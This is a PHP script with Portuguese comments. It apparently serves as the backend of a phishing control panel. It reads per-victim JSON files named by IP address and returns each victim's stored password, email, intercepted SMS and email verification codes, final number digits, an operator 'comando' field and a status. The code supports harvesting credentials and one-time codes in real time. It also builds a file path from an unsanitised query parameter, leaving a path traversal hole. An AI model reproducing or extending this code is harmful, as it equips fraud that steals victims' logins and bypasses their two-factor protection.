<?php 

session_start();
$ip = $_GET['ip'];

if($ip === "::1"){
    $ip = "127.0.1";
}



// Pasta onde estão os arquivos JSON
$pasta_clientes = '../../clientes/';

// Nome do arquivo JSON
$arquivo_json = $pasta_clientes . $ip . '.json';

// Verifica se o arquivo existe
if (file_exists($arquivo_json)) {
    // Lê o conteúdo do arquivo JSON
    $json_string = file_get_contents($arquivo_json);

    // Decodifica o JSON para um array associativo
    $dados_cliente = json_decode($json_string, true);

    // Verifica se a decodificação foi bem-sucedida
    if ($dados_cliente === null) {
        echo "Erro ao decodificar o arquivo JSON: $arquivo_json <br>";
    } else {
        // Altera o valor da chave 'email'
        $senha = $dados_cliente['senha'];
        $ip = $dados_cliente['ip'];
        $email = $dados_cliente['email'];
        $senha = $dados_cliente['senha'];
        $comando = $dados_cliente['comando'];
        $status = $dados_cliente['status'];
        $codigosms = $dados_cliente['codigosms'];
        $codigoemail = $dados_cliente['codigoemail'];
        $finalnumero = $dados_cliente['finalnumero'];
        $data = $dados_cliente['data_acesso'];
        

        $response = array(
    "senha" => $senha,
    "ip" => $ip,
    "email" => $email,
    "comando" => $comando,
    "status" => $status,
    "codigo" => $codigosms,
    "codigoemail" => $codigoemail,    
    "finalnumero" => $finalnumero,
    "data_acesso" => $data
);

// Encode o array associativo como JSON
$json_response = json_encode($response);

// Defina o cabeçalho Content-Type para indicar que a resposta é JSON
header('Content-Type: application/json');

// Envie a resposta JSON


        // Converte os dados modificados de volta para JSON
        $json_atualizado = json_encode($dados_cliente);

        // Verifica se houve erro na conversão para JSON
        if ($json_atualizado === false) {
            echo "Erro ao codificar os dados para JSON.";
        } else {
            // Salva o JSON atualizado no arquivo
            if (file_put_contents($arquivo_json, $json_atualizado) !== false) {
                // header('location: ../passwd/password.php');
            	echo $json_response;
            } else {
                echo "Erro ao salvar o arquivo JSON.";
            }
        }
    }
} else {
    echo "O arquivo JSON não foi encontrado.";
}


?>